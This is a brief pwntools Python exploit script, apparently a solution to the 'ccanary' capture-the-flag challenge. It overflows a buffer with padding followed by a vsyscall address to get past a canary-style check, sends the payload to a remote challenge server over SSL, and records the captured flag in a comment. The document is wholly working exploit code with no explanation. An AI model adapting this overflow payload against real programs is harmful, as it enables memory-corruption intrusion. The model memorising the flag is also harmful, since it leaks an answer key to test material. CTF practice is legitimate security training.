from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('ccanary')
io = remote('7b0000007645c3ae18411467-ccanary.challenge.master.allesctf.net', 31337, ssl=True)
elf = ELF('ccanary')
vsyscall = 0xffffffffff600000

payload = b'a' * 0x1f + p64(vsyscall) + p64(1)
io.sendlineafter('quote> ', payload, timeout=100000)
# io.sendline(payload)
io.recvuntil('}')
# ALLES!{th1s_m1ght_n0t_work_on_y0ur_syst3m_:^)}
